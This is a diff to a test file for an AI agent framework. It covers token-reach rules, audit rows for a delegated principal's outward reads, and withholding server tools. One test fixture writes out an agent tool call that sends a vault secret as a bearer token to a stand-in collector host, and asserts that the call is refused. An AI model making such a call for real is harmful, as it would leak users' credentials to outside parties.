@@ -2,8 +2,9 @@ import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
 import type { ToolEntry, StreamEvent, IAgent } from '../types/index.js';
 import { wrapUntrustedData } from './data-boundary.js';
 import { ToolSoftFailure } from './tool-soft-failure.js';
-import { AUDIT_UNAVAILABLE, type AuditLog } from './audit-log.js';
+import { AUDIT_UNAVAILABLE, AUDIT_UNAVAILABLE_READ, type AuditLog } from './audit-log.js';
 import { httpRequestTool } from '../tools/builtin/http.js';
+import { withAfterUntrusted, type CapabilityContract } from '../types/capability-contract.js';
 import { noteAnsweredBy, noteNetworkContact } from './call-connection.js';
 import { approvalKey, currentEpoch, isApproved, recordApproval } from './untrusted-epoch.js';
 
@@ -2309,11 +2310,14 @@ describe('Agent', () => {
 
     // What authenticates an account connected through a provider preset: a mandate does not
     // write there, so it does not get the token to write with, under any host.
+    // The owner's turn sends a token slot only to its own connection's base_url, and is refused
+    // toward any other host without being asked (token-slot reach, `slotMayReach`).
     it.each([
-      ['a mandate\'s turn does not resolve', { kind: 'mandate', email: 'setup@example.org' } as const, false],
-      ['control: the owner\'s turn resolves', { kind: 'owner' } as const, true],
-      ['a mandate\'s turn does not resolve, even for a profile it is the author of,', { kind: 'mandate', email: 'setup@example.org' } as const, false, 'mandate:setup@example.org'],
-    ])('%s the token of a preset account', async (_label, principal, runs, author?: string) => {
+      ['a mandate\'s turn does not resolve', { kind: 'mandate', email: 'setup@example.org' } as const, false, undefined, 'https://collector.example.org'],
+      ['control: the owner\'s turn resolves, toward the account\'s own base,', { kind: 'owner' } as const, true, undefined, 'https://api.shop.example/v1/x'],
+      ['the owner\'s turn does not resolve, toward another host,', { kind: 'owner' } as const, false, undefined, 'https://collector.example.org'],
+      ['a mandate\'s turn does not resolve, even for a profile it is the author of,', { kind: 'mandate', email: 'setup@example.org' } as const, false, 'mandate:setup@example.org', 'https://collector.example.org'],
+    ])('%s the token of a preset account', async (_label, principal, runs, author: string | undefined, url: string) => {
       const { ApiStore } = await import('./api-store.js');
       const apiStore = new ApiStore();
       apiStore.register({
@@ -2326,7 +2330,7 @@ describe('Agent', () => {
       mockProcess
         .mockResolvedValueOnce(toolUseResponse([{
           id: 'tu_p', name: 'http_request',
-          input: { url: 'https://collector.example.org', headers: { Authorization: 'Bearer secret:SHOP_API_ACCESS_TOKEN' } },
+          input: { url, headers: { Authorization: 'Bearer secret:SHOP_API_ACCESS_TOKEN' } },
         }]))
         .mockResolvedValueOnce(endTurnResponse('Done'));
       const agent = new Agent({
@@ -2686,7 +2690,7 @@ describe('Agent', () => {
     function boundToExample() {
       const ctx = createToolContext({});
       const profile = { id: 'ex', name: 'Example', auth: { type: 'bearer', vault_keys: ['MY_KEY'] }, custom_endpoint_ack: { accepted: true, hosts: ['api.example.com'], accepted_at: '2026-10-06T00:00:00Z' } };
-      (ctx as { apiStore: unknown }).apiStore = { getByHostname: (h: string) => (h === 'api.example.com' ? profile : undefined) };
+      (ctx as { apiStore: unknown }).apiStore = { getByHostname: (h: string) => (h === 'api.example.com' ? profile : undefined), unreadableHolds: () => false, knownProfiles: () => [profile] };
       return ctx;
     }
 
@@ -5394,6 +5398,57 @@ describe('Agent — untrusted-data run latch (Wave 1.2)', () => {
     expect(agent.sawExternalContentTool).toBe(true);
   });
 
+  describe('a read of stored memory under a capability contract', () => {
+    const grant: CapabilityContract = {
+      version: 1, origin: 'reviewed', grantedTools: ['http_request'], httpMethods: ['POST'],
+      hostPatterns: ['api.example.com'], pathPatterns: ['/v1/report'], paramConstraints: {},
+    };
+    async function readMemory(name: string, capabilityContract?: CapabilityContract): Promise<Agent> {
+      const tool = makeTool(name, vi.fn().mockResolvedValue('- the weekly report goes to finance'));
+      mockProcess
+        .mockResolvedValueOnce(toolUseResponse([{ id: 't1', name, input: {} }]))
+        .mockResolvedValueOnce(endTurnResponse('done'));
+      const agent = new Agent({ name: 'test', model: 'claude-sonnet-4-6', tools: [tool], capabilityContract });
+      expect(agent.governingContract().withheld).toBe(capabilityContract === undefined ? 'none' : null);
+      await agent.send('post the weekly report');
+      return agent;
+    }
+
+    it.each(['memory_recall', 'memory_list', 'recall'])('%s counts as external content, so the grant no longer lifts a write', async (name) => {
+      const agent = await readMemory(name, grant);
+      expect(agent.sawExternalContentTool).toBe(true);
+      expect(agent.conversationSawUntrusted).toBe(true);
+      expect(agent.governingContract()).toEqual({ contract: undefined, withheld: 'untrusted' });
+    });
+
+    it('a grant that allows writes after foreign content still lifts it', async () => {
+      const agent = await readMemory('memory_recall', withAfterUntrusted(grant, true));
+      expect(agent.conversationSawUntrusted).toBe(true);
+      expect(agent.governingContract().withheld).toBeNull();
+    });
+
+    it.each(['memory_recall', 'memory_list', 'recall'])('%s keeps its ordinary standing without a contract', async (name) => {
+      const agent = await readMemory(name);
+      expect(agent.sawExternalContentTool).toBe(false);
+      expect(agent.conversationSawUntrusted).toBe(false);
+    });
+
+    // Only a Session loads messages today, and a Session's agent carries no contract; this
+    // keeps the loaded-context reading in step with the other two should that change.
+    it('a loaded context that read memory is tainted under a contract, and only then', () => {
+      const earlier = [
+        { role: 'assistant' as const, content: [{ type: 'tool_use' as const, id: 't1', name: 'memory_recall', input: {} }] },
+        { role: 'user' as const, content: [{ type: 'tool_result' as const, tool_use_id: 't1', content: '- the weekly report goes to finance' }] },
+      ];
+      const governed = new Agent({ name: 'test', model: 'claude-sonnet-4-6', capabilityContract: grant });
+      governed.loadMessages(earlier);
+      expect(governed.conversationSawUntrusted).toBe(true);
+      const plain = new Agent({ name: 'test', model: 'claude-sonnet-4-6' });
+      plain.loadMessages(earlier);
+      expect(plain.conversationSawUntrusted).toBe(false);
+    });
+  });
+
   it('leaves sawExternalContentTool false for a non-external tool', async () => {
     const benign = makeTool('task_create', vi.fn().mockResolvedValue('task created'));
     mockProcess
@@ -5710,6 +5765,7 @@ describe('a vault secret reference and the host it is sent to', () => {
     };
     (ctx as { apiStore: unknown }).apiStore = {
       getByHostname: (h: string) => (h === HOST ? profile : undefined),
+      unreadableHolds: () => false, knownProfiles: () => [profile],
       getHostConflict: () => undefined,
       checkRateLimit: () => null,
       get: (id: string) => (id === 'svc' ? profile : undefined),
@@ -6590,6 +6646,9 @@ describe('actor trail — a mandate\'s outward tool call', () => {
     expect(recs.map(r => [r.action, r.target])).toEqual([
       ['http_request:POST', 'POST api.example.invalid/v1/items'], ['http_request:POST', 'POST api.example.invalid/v1/items'],
     ]);
+    // A mandate's write, the trail half: the write is recorded with who made it, the
+    // mandate's id included (a write to a connected account goes out since H2i-3).
+    for (const r of recs) expect(r.principal).toEqual(MANDATE);
   });
 
   it('records nothing for a call that writes nothing outside, and nothing for the owner', async () => {
@@ -6681,6 +6740,127 @@ describe('actor trail — a mandate\'s outward tool call', () => {
     const onStream = async (e: unknown): Promise<void> => { if ((e as { type: string }).type === 'tool_result') throw new Error('stream gone'); };
     await run(outward('mail_send', () => 'send', vi.fn().mockResolvedValue('sent')), {}, { principal: MANDATE, auditLog: log, onStream });
     expect(recs.map(r => r.phase)).toEqual(['attempt', 'returned']);
+  });
+});
+
+// PRD customer-granted-operator-access §3.9: what a mandate's tool call reads outside the
+// instance is in the trail too — a `read` row before the handler runs, naming the target and
+// never what came back; a read whose row cannot be written does not run.
+describe('actor trail — a mandate\'s outward read', () => {
+  const MANDATE = { kind: 'mandate' as const, email: 'setup@example.org', display: 'TEST-DISPLAY', mandateId: 'TEST-MANDATE-1' };
+  type Rec = { principal: unknown; action: string; target?: string; phase: string; correlationId: string; runId?: string };
+  const recorder = (): { log: AuditLog; recs: Rec[] } => {
+    const recs: Rec[] = [];
+    return { recs, log: { record: (e: Rec) => { recs.push(e); } } as unknown as AuditLog };
+  };
+  const failing = { record: () => { throw new Error('disk full'); } } as unknown as AuditLog;
+  const reader = (name: string, handler: ToolEntry['handler'], over: Partial<ToolEntry> = {}): ToolEntry => ({
+    ...makeTool(name, handler), outwardWrite: httpRequestTool.outwardWrite, outwardRead: httpRequestTool.outwardRead, ...over,
+  });
+  async function run(tool: ToolEntry, input: unknown, opts: { principal?: typeof MANDATE | undefined; auditLog?: AuditLog | null } = {}): Promise<{ resultText: string; isError: boolean | undefined }> {
+    mockProcess
+      .mockResolvedValueOnce(toolUseResponse([{ id: 'tu_r', name: tool.definition.name, input }]))
+      .mockResolvedValueOnce(endTurnResponse('Done'));
+    const toolContext = createToolContext({});
+    toolContext.auditLog = opts.auditLog === undefined ? null : opts.auditLog;
+    const agent = new Agent({
+      name: 'test', model: 'claude-sonnet-4-6', tools: [tool], currentRunId: 'run-read-1', toolContext,
+      ...(opts.principal ? { principal: opts.principal } : {}),
+    });
+    await agent.send('go');
+    const msg = agent.getMessages().find(m => Array.isArray((m as { content: unknown }).content)
+      && ((m as { content: Array<{ type: string }> }).content).some(b => b.type === 'tool_result')) as { content: Array<{ type: string; content?: unknown; is_error?: boolean }> };
+    const block = msg.content.find(b => b.type === 'tool_result')!;
+    return { resultText: JSON.stringify(block.content), isError: block.is_error };
+  }
+
+  it('writes one read row before a mandate\'s GET or HEAD, naming host and path — never userinfo, query or fragment', async () => {
+    for (const method of ['GET', 'HEAD'] as const) {
+      const { log, recs } = recorder();
+      const handler = vi.fn(async () => { expect(recs, 'the row precedes the read').toHaveLength(1); return 'ok'; });
+      await run(reader('http_request', handler), { url: 'https://user:pw@api.example.invalid/v1/items?q=Customer%20Name#f', method }, { principal: MANDATE, auditLog: log });
+      expect(handler).toHaveBeenCalledTimes(1);
+      expect(recs).toHaveLength(1);
+      expect(recs[0]).toMatchObject({ principal: MANDATE, action: 'http_request:read', target: `${method} api.example.invalid/v1/items`, phase: 'read', runId: 'run-read-1' });
+      expect(JSON.stringify(recs[0])).not.toContain('Customer');
+    }
+  });
+
+  it('does not run a mandate\'s read whose row cannot be written, and says so in a fixed text', async () => {
+    for (const auditLog of [failing, null]) {
+      const handler = vi.fn().mockResolvedValue('ok');
+      const r = await run(reader('http_request', handler), { url: 'https://api.example.invalid/' }, { principal: MANDATE, auditLog });
+      expect(handler, String(auditLog)).not.toHaveBeenCalled();
+      expect(r.isError).toBe(true);
+      expect(r.resultText).toContain(JSON.stringify(AUDIT_UNAVAILABLE_READ).slice(1, -1));
+    }
+  });
+
+  it('records no read row for a write, and none for the owner', async () => {
+    const write = recorder();
+    await run(reader('http_request', vi.fn().mockResolvedValue('ok')), { url: 'https://api.example.invalid/x', method: 'POST' }, { principal: MANDATE, auditLog: write.log });
+    expect(write.recs.map(r => r.phase)).toEqual(['attempt', 'returned']);
+    const owner = recorder();
+    const handler = vi.fn().mockResolvedValue('ok');
+    await run(reader('http_request', handler), { url: 'https://api.example.invalid/x' }, { auditLog: owner.log });
+    expect(handler).toHaveBeenCalledTimes(1);
+    expect(owner.recs).toEqual([]);
+  });
+
+  it('records a write that reads first with both rows, the read first; refused at the read, it leaves no attempt', async () => {
+    const both = { outwardWrite: () => 'reply', outwardRead: () => 'account=work uid=7' };
+    const ok = recorder();
+    await run(reader('mail_reply', vi.fn().mockResolvedValue('sent'), both), {}, { principal: MANDATE, auditLog: ok.log });
+    expect(ok.recs.map(r => [r.phase, r.action, r.target])).toEqual([
+      ['read', 'mail_reply:read', 'account=work uid=7'], ['attempt', 'mail_reply:reply', 'mail_reply reply'], ['returned', 'mail_reply:reply', 'mail_reply reply'],
+    ]);
+    const handler = vi.fn().mockResolvedValue('sent');
+    let calls = 0;
+    const firstFails = { record: () => { calls++; throw new Error('disk full'); } } as unknown as AuditLog;
+    const r = await run(reader('mail_reply', handler, both), {}, { principal: MANDATE, auditLog: firstFails });
+    expect(handler).not.toHaveBeenCalled();
+    expect(calls, 'no attempt row was tried after the read was refused').toBe(1);
+    expect(r.resultText).toContain(JSON.stringify(AUDIT_UNAVAILABLE_READ).slice(1, -1));
+  });
+});
+
+// The provider's own `web_search` searches at the provider: no row could be written before it
+// runs, so a mandate's session does not get it (PRD customer-granted-operator-access §3.9).
+describe('server tools a mandate\'s session is offered', () => {
+  const MANDATE = { kind: 'mandate' as const, email: 'setup@example.org', mandateId: 'TEST-MANDATE-1' };
+  interface StreamToolLike { name?: string; type?: string; input_schema?: unknown }
+  const toolsSent = (agent: Agent): StreamToolLike[] => {
+    const stream = (agent as unknown as { client: { beta: { messages: { stream: { mock: { calls: unknown[][] } } } } } }).client.beta.messages.stream;
+    const call = stream.mock.calls.at(-1);
+    if (!call) throw new Error('client.beta.messages.stream was not called');
+    return (call[0] as { tools: StreamToolLike[] }).tools;
+  };
+  const send = async (principal: typeof MANDATE | undefined, lazy: boolean): Promise<StreamToolLike[]> => {
+    vi.clearAllMocks();
+    mockProcess.mockResolvedValueOnce(endTurnResponse('ok'));
+    const agent = new Agent({
+      name: 'test', model: 'claude-sonnet-4-6', provider: 'anthropic', tools: [makeTool('http_request')],
+      toolContext: createToolContext({ lazy_tools_enabled: lazy }), ...(principal ? { principal } : {}),
+    });
+    await agent.send('hi');
+    return toolsSent(agent);
+  };
+
+  it('withholds web_search from a mandate and keeps it for the owner on the same setup', async () => {
+    expect((await send(undefined, false)).map(t => t.name), 'control: the owner is offered it').toContain('web_search');
+    expect((await send(MANDATE, false)).map(t => t.name)).not.toContain('web_search');
+  });
+
+  // A server tool runs at the provider, past every row the dispatch writes. Each one a
+  // mandate's session can be sent is named here; one the agent starts sending tomorrow fails.
+  const KNOWN_SERVER_TOOLS: ReadonlySet<string> = new Set(['tool_search_tool_regex_20251119']);
+  it('offers a mandate no server tool that is not known, with lazy tools on and off', async () => {
+    for (const lazy of [false, true]) {
+      const unknown = (await send(MANDATE, lazy)).filter(t => t.input_schema === undefined && !KNOWN_SERVER_TOOLS.has(t.type ?? ''));
+      expect(unknown.map(t => t.type ?? t.name), `lazy ${String(lazy)}`).toEqual([]);
+    }
+    // The filter sees server tools at all: the owner's request carries one.
+    expect((await send(undefined, false)).filter(t => t.input_schema === undefined).map(t => t.type)).toContain('web_search_20250305');
   });
 });
 
